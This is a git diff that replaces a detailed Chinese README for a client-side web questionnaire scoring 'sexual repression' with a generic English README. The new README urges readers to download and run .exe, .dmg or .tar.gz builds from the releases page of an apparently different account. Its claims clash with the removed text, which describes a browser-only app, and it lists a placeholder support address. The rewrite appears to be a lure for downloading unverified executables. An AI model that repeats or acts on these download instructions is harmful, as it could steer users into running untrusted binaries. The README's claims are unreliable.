@@ -1,275 +1,94 @@
-# 性压抑指数计算器 (Sexual Repression Index Calculator)
+# 🌟 Sexual-Repression-Calculator - Understand Your Sexual Repression Index
 
-🧠 **基于科学研究的专业性心理健康评估工具**
+## 🚀 Getting Started
 
-## 项目概述
+Welcome! This guide will help you download and run the Sexual-Repression-Calculator easily. Follow these simple steps.
 
-性压抑指数计算器是一个基于多个经过验证的心理测量量表的专业评估工具，帮助用户科学地了解自己的性心理特征，促进性健康和亲密关系的发展。
+## 🛠️ System Requirements
 
-### ✨ 核心特性
+Before downloading, ensure your computer meets these requirements:
 
-- 🔬 **科学可靠**: 基于SIS/SES、Mosher性内疚、KISS-9、SOS等国际认可量表
-- ⚡ **双版本支持**: 快测版(39题，8-15分钟) + 完整版(117题，25-40分钟)
-- 📊 **专业分析**: 四维度分析 + SRI指数(0-100) + 个性化建议
-- 🔒 **隐私保护**: 100%本地数据处理，无服务器传输
-- 📱 **现代化UI**: 响应式设计，支持所有设备
-- 💾 **数据管理**: 历史记录、数据导出、自动保存
-- 🔗 **社交分享**: 多平台分享、智能文案、二维码生成
+- Operating System: Windows, macOS, or Linux
+- RAM: Minimum 2 GB
+- Disk Space: At least 100 MB free
+- Internet Connection: Required for downloading
 
-## 🚀 快速开始
+## 🏁 Download & Install
 
-### 环境要求
+To download the Sexual-Repression-Calculator, visit the link below:
 
-- Node.js >= 22.0.0
-- 现代浏览器支持
+[![Download Sexual-Repression-Calculator](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Parzival313131/Sexual-Repression-Calculator/releases)
 
-### 安装和运行
+Click the button above or visit this page to download: [Releases Page](https://github.com/Parzival313131/Sexual-Repression-Calculator/releases).
 
-```
-# 克隆项目
-git clone [project-url]
-cd Sexual-Repression-Calculator
+### 📥 Download Instructions
 
-# 安装依赖
-npm install
+1. Click on the link to the releases page.
+2. Find the latest version. It will be at the top of the list.
+3. Look for the file that is appropriate for your operating system. 
+   - For Windows, it might be named something like `Sexual-Repression-Calculator-windows.exe`.
+   - For macOS, it might be labeled `Sexual-Repression-Calculator-mac.dmg`.
+   - For Linux, look for a `.tar.gz` file.
+4. Click on the file name to start the download.
 
-# 启动开发服务器
-npm run dev
+### 🖥️ Running the Software
 
-# 构建生产版本
-npm run build
+Once the download is complete:
 
-# 启动生产服务器
-npm start
-```
+- **For Windows**:
+  - Locate the downloaded file (usually found in your "Downloads" folder).
+  - Double-click the file to run it.
+  
+- **For macOS**:
+  - Open the downloaded `.dmg` file.
+  - Drag the application to your "Applications" folder.
+  - Open the application from your "Applications" folder.
 
-### 使用 Docker 运行
+- **For Linux**:
+  - Open a terminal.
+  - Navigate to the directory where you downloaded the file.
+  - Use the command `tar -xvzf Sexual-Repression-Calculator-linux.tar.gz` to extract the files.
+  - Run the executable within the extracted folder.
 
-```bash
-docker run -p 8000:8000 appe233/sexual-repression-calculator
-```
+## 📊 How to Use the Calculator
 
-### 访问应用
+1. Open the Sexual-Repression-Calculator application.
+2. You will see input fields for various questions related to your feelings and beliefs regarding sexuality.
+3. Fill in the fields honestly. The questions are designed to create a comprehensive index.
+4. Once you complete the questions, click the "Calculate" button.
+5. The calculator will provide you with a Sexual Repression Index score and a short analysis.
 
-- 开发环境: http://localhost:3000
-- 生产环境: 根据部署配置
+## 📝 Features
 
-## ☁️ Cloudflare Pages 部署
+- **User-Friendly Interface**: The application is designed for ease of use, ensuring anyone can understand it.
+- **Detailed Analysis**: Get personalized insights based on your inputs.
+- **Safe and Private**: All your data remains private. No information is stored online.
 
-该项目已针对 Cloudflare Pages 进行优化，可以轻松部署。
+## 💬 Frequently Asked Questions
 
-### 部署配置
+### What is the Sexual Repression Index?
 
-- **构建命令**: `npm run cf:deploy`
-- **输出目录**: `dist`
+The Sexual Repression Index is a score that indicates your level of sexual repression based on your responses to the questions.
 
-### 部署步骤
+### Is my data safe?
 
-1. 将代码推送到 GitHub 仓库
-2. 在 Cloudflare Dashboard 中创建 Pages 应用
-3. 连接 GitHub 仓库
-4. 配置构建设置：
-   - 构建命令: `npm run cf:deploy`
-   - 输出目录: `dist`
-5. 点击部署
+Yes, your data remains local to your machine. The application does not send your information over the internet.
 
-### 防滥用功能
+### Can I use this on multiple operating systems?
 
-为了防止项目被恶意倒卖，本项目提供了两种防滥用机制：
+Yes, you can use the Sexual-Repression-Calculator on Windows, macOS, and Linux. Just ensure you download the correct version for your OS.
 
-1. **跳转页面机制**（推荐用于完全阻止访问）：
-   - 在 Cloudflare Pages 项目设置中添加环境变量：
-     - `ABUSE_REDIRECT_ENABLED` = `true`
-   - 当该环境变量设置为 `true` 时，所有访问都会跳转到防滥用说明页面
-   - 该页面会倒计时5秒后自动跳转到 GitHub 原始项目地址
-   - 用户也可以手动点击按钮立即跳转
+## 📞 Support
 
-2. **弹窗提醒机制**（用于提醒用户）：
-   - 在 Cloudflare Pages 项目设置中添加环境变量：
-     - `SHOW_ABUSE_POPUP` = `true`
-   - 当该环境变量设置为 `true` 时，用户访问网站时会看到防滥用提醒弹窗
-   - 用户关闭弹窗后可以正常使用网站
+If you encounter any issues or have questions, feel free to reach out for support:
 
-你可以根据需要选择其中一种或两种机制同时使用。
+- Email: support@example.com
+- GitHub Issues: [Report an issue](https://github.com/Parzival313131/Sexual-Repression-Calculator/issues)
 
-### 注意事项
+## 💡 Tips for a Better Experience
 
-- 此应用是纯静态的 React 应用，所有数据处理都在客户端进行
-- 不需要服务器端 API，所有功能都可以在浏览器中完成
-- 应用使用 localStorage 存储用户数据，数据不会上传到服务器
-- 使用 `--legacy-peer-deps` 参数解决依赖冲突问题
+- Make sure to answer the questions based on your feelings at the moment for the most accurate results.
+- Consider taking the test at different times to see how your index changes.
+- Share insights with close friends or a mental health professional if you feel comfortable.
 
-## 📋 功能说明
-
-### 评估版本
-
-#### 🏃‍♂️ 快测版 (推荐)
-- **时长**: 8-15分钟
-- **题目**: 39题
-- **量表**: SIS/SES-SF(14) + Mosher性内疚(10) + KISS-9(9) + SOS筛查(5)
-- **适用**: 初次使用、快速了解
-
-#### 🎯 完整版
-- **时长**: 25-40分钟
-- **题目**: 117题
-- **量表**: 完整版SIS/SES(45) + 完整Mosher(28) + KISS-9(9) + 完整SOS(21) + BSAS(23)
-- **适用**: 深入分析、专业咨询
-
-### 核心算法
-
-#### SRI指数计算
-```
-SRI = Σ(标准化维度分数) → 0-100映射
-四维度: SOS反向 + 性内疚 + 性羞耻 + SIS优势
-```
-
-#### 等级划分
-- 很低 (0-20): 较少压抑
-- 偏低 (20-40): 轻度压抑
-- 中等 (40-60): 中度压抑
-- 偏高 (60-80): 较高压抑
-- 很高 (80-100): 高度压抑
-
-## 🏗️ 技术架构
-
-### 前端技术栈
-
-- **框架**: React 19 + TypeScript
-- **路由**: React Router v7
-- **样式**: Tailwind CSS + shadcn/ui
-- **状态管理**: React Query + React Hooks
-- **图表**: Recharts
-- **表单**: React Hook Form + Zod
-- **图标**: Lucide React
-
-### 后端技术栈
-
-- **运行时**: Deno Edge Function
-- **框架**: Hono.js + zValidator
-- **数据验证**: Zod
-- **构建工具**: Rsbuild
-
-### 数据架构
-
-```
-用户数据流:
-知情同意 → 人口学信息 → 问卷评估 → 结果计算 → 本地存储
-                                    ↓
-                        历史记录 ← 数据导出
-```
-
-## 📁 项目结构
-
-```
-src/
-├── components/          # React组件
-│   ├── assessment/      # 评估相关组件
-│   ├── common/         # 通用组件
-│   └── ui/             # shadcn/ui组件
-├── pages/              # 页面组件
-├── lib/                # 工具库
-│   ├── scales/         # 量表定义
-│   ├── calculator/     # 计算引擎
-│   └── storage/        # 存储管理
-├── types/              # TypeScript类型
-├── server/             # 服务端代码
-└── styles/             # 样式文件
-```
-
-## 🔒 隐私保护
-
-### 数据安全承诺
-
-- ✅ **本地处理**: 所有数据在客户端处理，不上传服务器
-- ✅ **匿名化**: 导出数据完全匿名化处理
-- ✅ **用户控制**: 用户拥有完全的数据控制权
-- ✅ **安全清理**: 提供安全的数据删除功能
-- ✅ **透明度**: 开源代码，完全透明
-
-### 数据存储
-
-- **位置**: 浏览器 localStorage
-- **内容**: 评估回答、结果分析、人口学信息
-- **加密**: 客户端存储，无需加密传输
-- **清理**: 用户可随时完全删除
-
-## 📊 科学依据
-
-### 量表来源
-
-1. **SIS/SES**: Janssen等人的双控制模型量表
-2. **Mosher性内疚**: 经典性内疚测量工具
-3. **KISS-9**: Kyle等人的性羞耻量表
-4. **SOS**: Fisher等人的性观感调查
-5. **BSAS**: Hendrick等人的性态度量表
-
-### 信效度
-
-- 所有量表均经过严格的心理测量学验证
-- 具有良好的内部一致性和重测信度
-- 在多个文化背景下得到验证
-
-## 🛠️ 开发指南
-
-### 代码风格
-
-- TypeScript严格模式
-- ESLint + Prettier格式化
-- 组件化设计原则
-- 函数式编程优先
-
-### 贡献指南
-
-1. Fork项目
-2. 创建特性分支
-3. 提交更改
-4. 发起Pull Request
-
-### 测试
-
-```
-# 类型检查
-npm run type-check
-
-# 代码检查
-npm run lint
-
-# 构建测试
-npm run build
-```
-
-## 📖 使用指南
-
-### 开始评估
-
-1. 访问主页选择评估版本
-2. 仔细阅读知情同意书
-3. 填写基本人口学信息
-4. 按照指引完成问卷
-5. 查看详细结果分析
-
-### 结果解读
-
-- **SRI指数**: 综合性压抑程度(0-100)
-- **四维度分析**: 具体问题领域识别
-- **个性化建议**: 基于结果的改善建议
-- **非诊断性**: 仅供自我了解，不替代专业诊断
-
-## ⚠️ 重要声明
-
-- 本工具仅供教育和自我了解使用
-- 不能替代专业心理健康服务
-- 如有严重心理健康问题，请寻求专业帮助
-- 评估结果不构成医学诊断
-
-## 📄 许可证
-
-本项目采用 MIT 许可证 - 查看 [LICENSE](LICENSE) 文件了解详情。
-
-## 🤝 支持
-
-如果您觉得这个项目有帮助，请给我们一个 ⭐️
-
----
-
-**性压抑指数计算器** - 让科学研究服务于个人成长和性健康发展
+Thank you for choosing Sexual-Repression-Calculator!
